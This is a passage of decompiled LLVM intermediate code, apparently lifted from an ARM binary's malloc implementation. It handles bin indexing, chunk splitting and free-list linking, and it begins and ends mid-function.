  %v4_118c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  %v3_118cc = udiv i32 %v0_11890, 8
  store i32 %v3_118cc, i32* @r7, align 4
  %v4_118d0 = mul nuw i32 %v3_118cc, 8
  %v5_118d0 = add i32 %v4_118c8, %v4_118d0
  store i32 %v5_118d0, i32* %r3.global-to-local, align 4
  %v1_118d4 = add i32 %v5_118d0, 44
  store i32 %v1_118d4, i32* %ip.global-to-local, align 4
  %v1_118d8 = add i32 %v5_118d0, 56
  %v2_118d8 = inttoptr i32 %v1_118d8 to i32*
  %v3_118d8 = load i32, i32* %v2_118d8, align 4
  store i32 %v3_118d8, i32* %r0.global-to-local, align 4
  %v9_118dc = icmp eq i32 %v3_118d8, %v1_118d4
  br i1 %v9_118dc, label %dec_label_pc_11a68, label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118c0
  %v2_118e4 = add i32 %v3_118d8, %v0_11890
  store i32 %v2_118e4, i32* %r3.global-to-local, align 4
  %v1_118e8 = add i32 %v2_118e4, 4
  %v2_118e8 = inttoptr i32 %v1_118e8 to i32*
  %v3_118e8 = load i32, i32* %v2_118e8, align 4
  store i32 %v3_118e8, i32* %r2.global-to-local, align 4
  %v1_118ec = add i32 %v3_118d8, 12
  %v2_118ec = inttoptr i32 %v1_118ec to i32*
  %v3_118ec = load i32, i32* %v2_118ec, align 4
  store i32 %v3_118ec, i32* %r1.global-to-local, align 4
  %v1_118f0 = or i32 %v3_118e8, 1
  store i32 %v1_118f0, i32* %r2.global-to-local, align 4
  %v1_118f4 = add i32 %v3_118d8, 8
  store i32 %v1_118f4, i32* %r4.global-to-local, align 4
  store i32 %v1_118f0, i32* %v2_118e8, align 4
  %v0_118fc = load i32, i32* %ip.global-to-local, align 4
  %v1_118fc = load i32, i32* %r1.global-to-local, align 4
  %v2_118fc = add i32 %v1_118fc, 8
  %v3_118fc = inttoptr i32 %v2_118fc to i32*
  store i32 %v0_118fc, i32* %v3_118fc, align 4
  %v0_11900 = load i32, i32* %r1.global-to-local, align 4
  %v1_11900 = load i32, i32* %ip.global-to-local, align 4
  %v2_11900 = add i32 %v1_11900, 12
  %v3_11900 = inttoptr i32 %v2_11900 to i32*
  store i32 %v0_11900, i32* %v3_11900, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11908:                               ; preds = %dec_label_pc_118b8
  store i32 %v0_11890, i32* %r0.global-to-local, align 4
  %v1_1190c = call i32 @__malloc_largebin_index(i32 %v0_11890)
  store i32 %v1_1190c, i32* %r0.global-to-local, align 4
  %v0_11910 = load i32, i32* @r4, align 4
  %v1_11910 = and i32 %v0_11910, 2
  %v2_11910 = icmp eq i32 %v1_11910, 0
  store i32 %v1_1190c, i32* @r7, align 4
  br i1 %v2_11910, label %dec_label_pc_11a68, label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_11908
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_11924 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11924, i32* @r0, align 4
  %v0_11928 = call i32 @__malloc_consolidate()
  store i32 %v0_11928, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a68

dec_label_pc_11930:                               ; preds = %dec_label_pc_11a7c
  %v1_11930 = add i32 %v3_11a7c, 4
  %v2_11930 = inttoptr i32 %v1_11930 to i32*
  %v3_11930 = load i32, i32* %v2_11930, align 4
  store i32 %v3_11930, i32* %r3.global-to-local, align 4
  %v0_11934 = load i32, i32* @sl, align 4
  %v1_11938 = and i32 %v3_11930, -4
  store i32 %v1_11938, i32* %r4.global-to-local, align 4
  %v1_1193c = add i32 %v3_11a7c, 12
  %v2_1193c = inttoptr i32 %v1_1193c to i32*
  %v3_1193c = load i32, i32* %v2_1193c, align 4
  store i32 %v3_1193c, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_11934, 255
  br i1 %tmp206, label %dec_label_pc_11998, label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_11930
  %v9_11944 = icmp eq i32 %v3_1193c, %v0_1199c
  br i1 %v9_11944, label %dec_label_pc_1194c, label %dec_label_pc_11998

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11944
  %v0_1194c = load i32, i32* @sb, align 4
  %v1_1194c = add i32 %v0_1194c, 48
  %v2_1194c = inttoptr i32 %v1_1194c to i32*
  %v3_1194c = load i32, i32* %v2_1194c, align 4
  store i32 %v3_1194c, i32* %r3.global-to-local, align 4
  %v9_11950 = icmp eq i32 %v3_11a7c, %v3_1194c
  br i1 %v9_11950, label %dec_label_pc_11958, label %dec_label_pc_11998

dec_label_pc_11958:                               ; preds = %dec_label_pc_1194c
  %v1_11958 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_11938, %v1_11958
  br i1 %tmp207, label %dec_label_pc_11960, label %dec_label_pc_11998

dec_label_pc_11960:                               ; preds = %dec_label_pc_11958
  %v2_11960 = sub i32 %v1_11938, %v0_11934
  store i32 %v2_11960, i32* %r2.global-to-local, align 4
  %v2_11964 = add i32 %v0_11934, %v3_11a7c
  store i32 %v2_11964, i32* %r3.global-to-local, align 4
  %v1_11968 = or i32 %v0_11934, 1
  store i32 %v1_11968, i32* %r0.global-to-local, align 4
  %v1_1196c = or i32 %v2_11960, 1
  store i32 %v1_1196c, i32* %r1.global-to-local, align 4
  %v1_11970 = add i32 %v3_11a7c, 8
  store i32 %v1_11970, i32* %r4.global-to-local, align 4
  %v2_11974 = add i32 %v0_1199c, 8
  %v3_11974 = inttoptr i32 %v2_11974 to i32*
  store i32 %v2_11964, i32* %v3_11974, align 4
  %v0_11978 = load i32, i32* %r3.global-to-local, align 4
  %v1_11978 = load i32, i32* %ip.global-to-local, align 4
  %v2_11978 = add i32 %v1_11978, 12
  %v3_11978 = inttoptr i32 %v2_11978 to i32*
  store i32 %v0_11978, i32* %v3_11978, align 4
  %v0_1197c = load i32, i32* %r0.global-to-local, align 4
  %v1_1197c = load i32, i32* @r6, align 4
  %v2_1197c = add i32 %v1_1197c, 4
  %v3_1197c = inttoptr i32 %v2_1197c to i32*
  store i32 %v0_1197c, i32* %v3_1197c, align 4
  %v0_11980 = load i32, i32* %r3.global-to-local, align 4
  %v1_11980 = load i32, i32* @sb, align 4
  %v2_11980 = add i32 %v1_11980, 48
  %v3_11980 = inttoptr i32 %v2_11980 to i32*
  store i32 %v0_11980, i32* %v3_11980, align 4
  %v0_11984 = load i32, i32* %r2.global-to-local, align 4
  %v1_11984 = load i32, i32* %r3.global-to-local, align 4
  %v3_11984 = add i32 %v1_11984, %v0_11984
  %v4_11984 = inttoptr i32 %v3_11984 to i32*
  store i32 %v0_11984, i32* %v4_11984, align 4
  %v0_11988 = load i32, i32* %r1.global-to-local, align 4
  %v1_11988 = load i32, i32* %r3.global-to-local, align 4
  %v2_11988 = add i32 %v1_11988, 4
  %v3_11988 = inttoptr i32 %v2_11988 to i32*
  store i32 %v0_11988, i32* %v3_11988, align 4
  %v0_1198c = load i32, i32* %ip.global-to-local, align 4
  %v1_1198c = load i32, i32* %r3.global-to-local, align 4
  %v2_1198c = add i32 %v1_1198c, 12
  %v3_1198c = inttoptr i32 %v2_1198c to i32*
  store i32 %v0_1198c, i32* %v3_1198c, align 4
  %v0_11990 = load i32, i32* %ip.global-to-local, align 4
  %v1_11990 = load i32, i32* %r3.global-to-local, align 4
  %v2_11990 = add i32 %v1_11990, 8
  %v3_11990 = inttoptr i32 %v2_11990 to i32*
  store i32 %v0_11990, i32* %v3_11990, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11998:                               ; preds = %dec_label_pc_11958, %dec_label_pc_1194c, %dec_label_pc_11944, %dec_label_pc_11930
  %v9_11998 = icmp eq i32 %v1_11938, %v0_11934
  %v2_1199c = add i32 %v3_1193c, 8
  %v3_1199c = inttoptr i32 %v2_1199c to i32*
  store i32 %v0_1199c, i32* %v3_1199c, align 4
  %v0_119a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_119a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_119a0 = add i32 %v1_119a0, 12
  %v3_119a0 = inttoptr i32 %v2_119a0 to i32*
  store i32 %v0_119a0, i32* %v3_119a0, align 4
  br i1 %v9_11998, label %dec_label_pc_11af8.loopexit, label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_11998
  %v0_119b4 = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_119b4, 255
  br i1 %tmp208, label %dec_label_pc_119d8, label %dec_label_pc_119bc

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119b4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v1_119c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_119c0 = add i32 %v1_119c0, ptrtoint (i32* @global_var_214b8.340 to i32)
  %v3_119c0 = inttoptr i32 %v2_119c0 to i32*
  %v4_119c0 = load i32, i32* %v3_119c0, align 4
  %v3_119c4 = udiv i32 %v0_119b4, 8
  store i32 %v3_119c4, i32* %r0.global-to-local, align 4
  %v4_119c8 = mul nuw i32 %v3_119c4, 8
  %v5_119c8 = add i32 %v4_119c0, %v4_119c8
  store i32 %v5_119c8, i32* %r3.global-to-local, align 4
  %v1_119cc = add i32 %v5_119c8, 44
  store i32 %v1_119cc, i32* %ip.global-to-local, align 4
  %v1_119d0 = add i32 %v5_119c8, 52
  %v2_119d0 = inttoptr i32 %v1_119d0 to i32*
  %v3_119d0 = load i32, i32* %v2_119d0, align 4
  store i32 %v3_119d0, i32* @lr, align 4
  br label %dec_label_pc_11a30

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119b4
  store i32 %v0_119b4, i32* %r0.global-to-local, align 4
  %v1_119dc = call i32 @__malloc_largebin_index(i32 %v0_119b4)
  store i32 %v1_119dc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v1_119e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_119e4 = add i32 %v1_119e4, ptrtoint (i32* @global_var_214b8.340 to i32)
  %v3_119e4 = inttoptr i32 %v2_119e4 to i32*
  %v4_119e4 = load i32, i32* %v3_119e4, align 4
  %v4_119e8 = mul i32 %v1_119dc, 8
  %v5_119e8 = add i32 %v4_119e4, %v4_119e8
  store i32 %v5_119e8, i32* %r3.global-to-local, align 4
  %v1_119ec = add i32 %v5_119e8, 44
  store i32 %v1_119ec, i32* %ip.global-to-local, align 4
  %v1_119f0 = add i32 %v5_119e8, 52
  %v2_119f0 = inttoptr i32 %v1_119f0 to i32*
  %v3_119f0 = load i32, i32* %v2_119f0, align 4
  store i32 %v3_119f0, i32* @lr, align 4
  %v9_119f4 = icmp eq i32 %v3_119f0, %v1_119ec
  br i1 %v9_119f4, label %dec_label_pc_11a30, label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119d8
  %v1_119fc = add i32 %v5_119e8, 56
  %v2_119fc = inttoptr i32 %v1_119fc to i32*
  %v3_119fc = load i32, i32* %v2_119fc, align 4
  store i32 %v3_119fc, i32* %r1.global-to-local, align 4
  %v1_11a00 = add i32 %v3_119fc, 4
  %v2_11a00 = inttoptr i32 %v1_11a00 to i32*
  %v3_11a00 = load i32, i32* %v2_11a00, align 4
  store i32 %v3_11a00, i32* %r3.global-to-local, align 4
  %v0_11a04 = load i32, i32* %r4.global-to-local, align 4
  %v3_11a04 = icmp ult i32 %v0_11a04, %v3_11a00
  br i1 %v3_11a04, label %.thread, label %dec_label_pc_11a20.preheader

.thread:                                          ; preds = %dec_label_pc_119fc
  store i32 %v1_119ec, i32* @lr, align 4
  store i32 %v3_119fc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a30

dec_label_pc_11a20.preheader:                     ; preds = %dec_label_pc_119fc
  %v2_11a0c = or i32 %v0_11a04, 1
  store i32 %v2_11a0c, i32* %r2.global-to-local, align 4
  %v1_11a20182 = add i32 %v3_119f0, 4
  %v2_11a20183 = inttoptr i32 %v1_11a20182 to i32*
  %v3_11a20184 = load i32, i32* %v2_11a20183, align 4
  store i32 %v3_11a20184, i32* %r3.global-to-local, align 4
  %v3_11a24186 = icmp ult i32 %v2_11a0c, %v3_11a20184
  br i1 %v3_11a24186, label %dec_label_pc_11a1c, label %dec_label_pc_11a2c

dec_label_pc_11a1c:                               ; preds = %dec_label_pc_11a20.preheader, %dec_label_pc_11a1c
  %v0_11a2c187 = phi i32 [ %v3_11a1c, %dec_label_pc_11a1c ], [ %v3_119f0, %dec_label_pc_11a20.preheader ]
  %v1_11a1c = add i32 %v0_11a2c187, 8
  %v2_11a1c = inttoptr i32 %v1_11a1c to i32*
  %v3_11a1c = load i32, i32* %v2_11a1c, align 4
  store i32 %v3_11a1c, i32* @lr, align 4
  %v1_11a20 = add i32 %v3_11a1c, 4
  %v2_11a20 = inttoptr i32 %v1_11a20 to i32*
  %v3_11a20 = load i32, i32* %v2_11a20, align 4
  store i32 %v3_11a20, i32* %r3.global-to-local, align 4
  %v3_11a24 = icmp ult i32 %v2_11a0c, %v3_11a20
  br i1 %v3_11a24, label %dec_label_pc_11a1c, label %dec_label_pc_11a2c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_11a1c, %dec_label_pc_11a20.preheader
  %v0_11a2c.lcssa = phi i32 [ %v3_119f0, %dec_label_pc_11a20.preheader ], [ %v3_11a1c, %dec_label_pc_11a1c ]
  %v1_11a2c = add i32 %v0_11a2c.lcssa, 12
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %.thread, %dec_label_pc_119d8, %dec_label_pc_119bc, %dec_label_pc_11a2c
  %v0_11a50 = phi i32 [ %v1_119ec, %dec_label_pc_119d8 ], [ %v1_119cc, %dec_label_pc_119bc ], [ %v3_11a2c, %dec_label_pc_11a2c ], [ %v3_119fc, %.thread ]
  %v0_11a44 = phi i32 [ %v1_119dc, %dec_label_pc_119d8 ], [ %v3_119c4, %dec_label_pc_119bc ], [ %v1_119dc, %dec_label_pc_11a2c ], [ %v1_119dc, %.thread ]
  %v1_11a34 = phi i32 [ %v1_119e4, %dec_label_pc_119d8 ], [ %v1_119c0, %dec_label_pc_119bc ], [ %v1_119e4, %dec_label_pc_11a2c ], [ %v1_119e4, %.thread ]
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v2_11a34 = add i32 %v1_11a34, ptrtoint (i32* @global_var_214b8.340 to i32)
  %v3_11a34 = inttoptr i32 %v2_11a34 to i32*
  %v4_11a34 = load i32, i32* %v3_11a34, align 4
  %v3_11a38 = sdiv i32 %v0_11a44, 32
  store i32 %v3_11a38, i32* %r3.global-to-local, align 4
  %v4_11a3c = mul nsw i32 %v3_11a38, 4
  %v5_11a3c = add i32 %v4_11a34, %v4_11a3c
  store i32 %v5_11a3c, i32* %r1.global-to-local, align 4
  %v1_11a40 = add i32 %v5_11a3c, 820
  %v2_11a40 = inttoptr i32 %v1_11a40 to i32*
  %v3_11a40 = load i32, i32* %v2_11a40, align 4
  %v1_11a44 = urem i32 %v0_11a44, 32
  store i32 %v1_11a44, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11a4c = shl i32 1, %v1_11a44
  %v8_11a4c = or i32 %v3_11a40, %v7_11a4c
  store i32 %v8_11a4c, i32* %r3.global-to-local, align 4
  %v1_11a50 = load i32, i32* @r6, align 4
  %v2_11a50 = add i32 %v1_11a50, 12
  %v3_11a50 = inttoptr i32 %v2_11a50 to i32*
  store i32 %v0_11a50, i32* %v3_11a50, align 4
  %v0_11a54 = load i32, i32* @lr, align 4
  %v1_11a54 = load i32, i32* @r6, align 4
  %v2_11a54 = add i32 %v1_11a54, 8
  %v3_11a54 = inttoptr i32 %v2_11a54 to i32*
  store i32 %v0_11a54, i32* %v3_11a54, align 4
  %v0_11a58 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a58 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a58 = add i32 %v1_11a58, 820
  %v3_11a58 = inttoptr i32 %v2_11a58 to i32*
  store i32 %v0_11a58, i32* %v3_11a58, align 4
  %v0_11a5c = load i32, i32* @r6, align 4
  %v1_11a5c = load i32, i32* @lr, align 4
  %v2_11a5c = add i32 %v1_11a5c, 12
  %v3_11a5c = inttoptr i32 %v2_11a5c to i32*
  store i32 %v0_11a5c, i32* %v3_11a5c, align 4
  %v0_11a60 = load i32, i32* @r6, align 4
  %v1_11a60 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a60 = add i32 %v1_11a60, 8
  %v3_11a60 = inttoptr i32 %v2_11a60 to i32*
  store i32 %v0_11a60, i32* %v3_11a60, align 4
  %v0_11a7c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11908, %dec_label_pc_118c0, %dec_label_pc_1191c
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_11a70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11a70, i32* @sb, align 4
  %v0_11a74 = load i32, i32* @sl, align 4
  %v1_11a74 = add i32 %v0_11a74, 16
  store i32 %v1_11a74, i32* @fp, align 4
  %v1_11a78 = add i32 %v4_11a70, 52
  store i32 %v1_11a78, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11a30, %dec_label_pc_11a68
  %v0_1199c = phi i32 [ %v0_11a7c.pre, %dec_label_pc_11a30 ], [ %v1_11a78, %dec_label_pc_11a68 ]
  %v1_11a7c = add i32 %v0_1199c, 12
  %v2_11a7c = inttoptr i32 %v1_11a7c to i32*
  %v3_11a7c = load i32, i32* %v2_11a7c, align 4
  store i32 %v3_11a7c, i32* @r6, align 4
  %v9_11a80 = icmp eq i32 %v3_11a7c, %v0_1199c
  br i1 %v9_11a80, label %dec_label_pc_11a88, label %dec_label_pc_11930

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a7c
  %v0_11a88 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_11a88, 256
  %v0_11b40.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_11a88.dec_label_pc_11b40_crit_edge, label %dec_label_pc_11a90

dec_label_pc_11a88.dec_label_pc_11b40_crit_edge:  ; preds = %dec_label_pc_11a88
  %.pre203 = mul i32 %v0_11b40.pre, 8
  br label %dec_label_pc_11b40

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a88
  %v4_11a90 = mul i32 %v0_11b40.pre, 8
  %v5_11a90 = add i32 %v4_11a90, %v0_1199c
  store i32 %v5_11a90, i32* %r3.global-to-local, align 4
  %v1_11a94 = add i32 %v5_11a90, -8
  store i32 %v1_11a94, i32* %r1.global-to-local, align 4
  %v1_11a98 = add i32 %v5_11a90, 4
  %v2_11a98 = inttoptr i32 %v1_11a98 to i32*
  %storemerge.pre = load i32, i32* %v2_11a98, align 4
  br label %dec_label_pc_11b38

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11b38
  %v1_11aa0 = add i32 %v1_11ac8, 4
  %v2_11aa0 = inttoptr i32 %v1_11aa0 to i32*
  %v3_11aa0 = load i32, i32* %v2_11aa0, align 4
  store i32 %v3_11aa0, i32* %r3.global-to-local, align 4
  %v1_11aa4 = and i32 %v3_11aa0, -4
  store i32 %v1_11aa4, i32* %r2.global-to-local, align 4
  %v3_11aa8 = icmp ult i32 %v1_11aa4, %v0_11a88
  %v1_11aac = add i32 %v1_11ac8, 12
  %v2_11aac = inttoptr i32 %v1_11aac to i32*
  %v3_11aac = load i32, i32* %v2_11aac, align 4
  store i32 %v3_11aac, i32* %r0.global-to-local, align 4
  br i1 %v3_11aa8, label %dec_label_pc_11b38, label %dec_label_pc_11ab4

dec_label_pc_11ab4:                               ; preds = %dec_label_pc_11aa0
  %v1_11ab4 = add i32 %v1_11ac8, 8
  %v2_11ab4 = inttoptr i32 %v1_11ab4 to i32*
  %v3_11ab4 = load i32, i32* %v2_11ab4, align 4
  store i32 %v3_11ab4, i32* %r1.global-to-local, align 4
  %v1_11ab8 = add i32 %v3_11ab4, 12
  %v2_11ab8 = inttoptr i32 %v1_11ab8 to i32*
  %v3_11ab8 = load i32, i32* %v2_11ab8, align 4
  store i32 %v3_11ab8, i32* %r3.global-to-local, align 4
  %v9_11abc = icmp eq i32 %v3_11ab8, %v1_11ac8
  br i1 %v9_11abc, label %dec_label_pc_11ac4, label %dec_label_pc_11ad0

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11ab4
  %v1_11ac4 = add i32 %v3_11aac, 8
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i32*
  %v3_11ac4 = load i32, i32* %v2_11ac4, align 4
  store i32 %v3_11ac4, i32* %r3.global-to-local, align 4
  %v9_11ac8 = icmp eq i32 %v3_11ac4, %v1_11ac8
  br i1 %v9_11ac8, label %dec_label_pc_11ad4, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ab4, %dec_label_pc_11ac4
  %v0_11ad0 = call i32 @abort()
  store i32 %v0_11ad0, i32* %r0.global-to-local, align 4
  %v0_11ad4.pre = load i32, i32* @sl, align 4
  %v1_11ad4.pre = load i32, i32* @r2, align 4
  %v0_11adc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11ad4

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11ac4, %dec_label_pc_11ad0
  %v1_11adc = phi i32 [ %v3_11aac, %dec_label_pc_11ac4 ], [ %v0_11ad0, %dec_label_pc_11ad0 ]
  %v0_11adc = phi i32 [ %v3_11ab4, %dec_label_pc_11ac4 ], [ %v0_11adc.pre, %dec_label_pc_11ad0 ]
  %v1_11ad4 = phi i32 [ %v1_11aa4, %dec_label_pc_11ac4 ], [ %v1_11ad4.pre, %dec_label_pc_11ad0 ]
  %v0_11ad4 = phi i32 [ %v0_11a88, %dec_label_pc_11ac4 ], [ %v0_11ad4.pre, %dec_label_pc_11ad0 ]
  %v2_11ad4 = sub i32 %v1_11ad4, %v0_11ad4
  store i32 %v2_11ad4, i32* %lr.global-to-local, align 4
  %v2_11adc = add i32 %v1_11adc, 8
  %v3_11adc = inttoptr i32 %v2_11adc to i32*
  store i32 %v0_11adc, i32* %v3_11adc, align 4
  %v0_11ae0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ae0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ae0 = add i32 %v1_11ae0, 12
  %v3_11ae0 = inttoptr i32 %v2_11ae0 to i32*
  store i32 %v0_11ae0, i32* %v3_11ae0, align 4
  %v0_11ae4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ae4 = add i32 %v0_11ae4, 8
  store i32 %v1_11ae4, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_11ad4, 15
  br i1 %tmp210, label %dec_label_pc_11b04, label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ad4
  %v1_11aec = load i32, i32* %r2.global-to-local, align 4
  %v2_11aec = add i32 %v1_11aec, %v0_11ae4
  store i32 %v2_11aec, i32* %r2.global-to-local, align 4
  %v1_11af0 = add i32 %v2_11aec, 4
  %v2_11af0 = inttoptr i32 %v1_11af0 to i32*
  %v3_11af0 = load i32, i32* %v2_11af0, align 4
  store i32 %v3_11af0, i32* %r3.global-to-local, align 4
  store i32 %v1_11ae4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11af8

dec_label_pc_11af8.loopexit:                      ; preds = %dec_label_pc_11998
  %v1_119a4 = load i32, i32* @r6, align 4
  %v2_119a4 = load i32, i32* @sl, align 4
  %v3_119a4 = add i32 %v2_119a4, %v1_119a4
  store i32 %v3_119a4, i32* %r2.global-to-local, align 4
  %v2_119a8 = add i32 %v3_119a4, 4
  %v3_119a8 = inttoptr i32 %v2_119a8 to i32*
  %v4_119a8 = load i32, i32* %v3_119a8, align 4
  store i32 %v4_119a8, i32* %r3.global-to-local, align 4
  %v2_119ac = add i32 %v1_119a4, 8
  store i32 %v2_119ac, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11af8

dec_label_pc_11af8:                               ; preds = %.dec_label_pc_11af8_crit_edge, %dec_label_pc_11af8.loopexit, %dec_label_pc_11aec
  %v1_11afc = phi i32 [ %v4_11c20, %.dec_label_pc_11af8_crit_edge ], [ %v3_119a4, %dec_label_pc_11af8.loopexit ], [ %v2_11aec, %dec_label_pc_11aec ]
  %v0_11af8 = phi i32 [ %v7_11c20, %.dec_label_pc_11af8_crit_edge ], [ %v4_119a8, %dec_label_pc_11af8.loopexit ], [ %v3_11af0, %dec_label_pc_11aec ]
  %v1_11af8 = or i32 %v0_11af8, 1
  store i32 %v1_11af8, i32* %r3.global-to-local, align 4
  %v2_11afc = add i32 %v1_11afc, 4
  %v3_11afc = inttoptr i32 %v2_11afc to i32*
  store i32 %v1_11af8, i32* %v3_11afc, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11ad4
  %v1_11b04 = load i32, i32* @sl, align 4
  %v2_11b04 = add i32 %v1_11b04, %v0_11ae4
  store i32 %v2_11b04, i32* %r2.global-to-local, align 4
  %v1_11b08 = or i32 %v1_11b04, 1
  store i32 %v1_11b08, i32* %r3.global-to-local, align 4
  %v0_11b0c = load i32, i32* %lr.global-to-local, align 4
  %v1_11b0c = or i32 %v0_11b0c, 1
  store i32 %v1_11b0c, i32* %r1.global-to-local, align 4
  store i32 %v1_11ae4, i32* %r4.global-to-local, align 4
  %v2_11b14 = add i32 %v0_11ae4, 4
  %v3_11b14 = inttoptr i32 %v2_11b14 to i32*
  store i32 %v1_11b08, i32* %v3_11b14, align 4
  %v0_11b18 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b18 = load i32, i32* @r6, align 4
  %v2_11b18 = add i32 %v1_11b18, 8
  %v3_11b18 = inttoptr i32 %v2_11b18 to i32*
  store i32 %v0_11b18, i32* %v3_11b18, align 4
  %v0_11b1c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b1c = load i32, i32* @r6, align 4
  %v2_11b1c = add i32 %v1_11b1c, 12
  %v3_11b1c = inttoptr i32 %v2_11b1c to i32*
  store i32 %v0_11b1c, i32* %v3_11b1c, align 4
  %v0_11b20 = load i32, i32* %lr.global-to-local, align 4
  %v1_11b20 = load i32, i32* %r2.global-to-local, align 4
  %v3_11b20 = add i32 %v1_11b20, %v0_11b20
  %v4_11b20 = inttoptr i32 %v3_11b20 to i32*
  store i32 %v0_11b20, i32* %v4_11b20, align 4
  %v0_11b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b24 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b24 = add i32 %v1_11b24, 4
  %v3_11b24 = inttoptr i32 %v2_11b24 to i32*
  store i32 %v0_11b24, i32* %v3_11b24, align 4
  %v0_11b28 = load i32, i32* @r6, align 4
  %v1_11b28 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b28 = add i32 %v1_11b28, 12
  %v3_11b28 = inttoptr i32 %v2_11b28 to i32*
  store i32 %v0_11b28, i32* %v3_11b28, align 4
  %v0_11b2c = load i32, i32* @r6, align 4
  %v1_11b2c = load i32, i32* %r2.global-to-local, align 4
  %v2_11b2c = add i32 %v1_11b2c, 8
  %v3_11b2c = inttoptr i32 %v2_11b2c to i32*
  store i32 %v0_11b2c, i32* %v3_11b2c, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11aa0, %dec_label_pc_11a90
  %v1_11ac8 = phi i32 [ %storemerge.pre, %dec_label_pc_11a90 ], [ %v3_11aac, %dec_label_pc_11aa0 ]
  store i32 %v1_11ac8, i32* %ip.global-to-local, align 4
  %v9_11b38 = icmp eq i32 %v1_11ac8, %v1_11a94
  br i1 %v9_11b38, label %dec_label_pc_11b40.loopexit, label %dec_label_pc_11aa0

dec_label_pc_11b40.loopexit:                      ; preds = %dec_label_pc_11b38
  br label %dec_label_pc_11b40

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11a88.dec_label_pc_11b40_crit_edge, %dec_label_pc_11b40.loopexit
  %v4_11b70.pre-phi = phi i32 [ %.pre203, %dec_label_pc_11a88.dec_label_pc_11b40_crit_edge ], [ %v4_11a90, %dec_label_pc_11b40.loopexit ]
  %v1_11b40 = add i32 %v0_11b40.pre, 1
  store i32 %v1_11b40, i32* %r2.global-to-local, align 4
  %v1_11b44 = urem i32 %v1_11b40, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r0.global-to-local, align 4
  %v6_11b50 = shl i32 1, %v1_11b44
  store i32 %v6_11b50, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11b58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11b58, i32* %r3.global-to-local, align 4
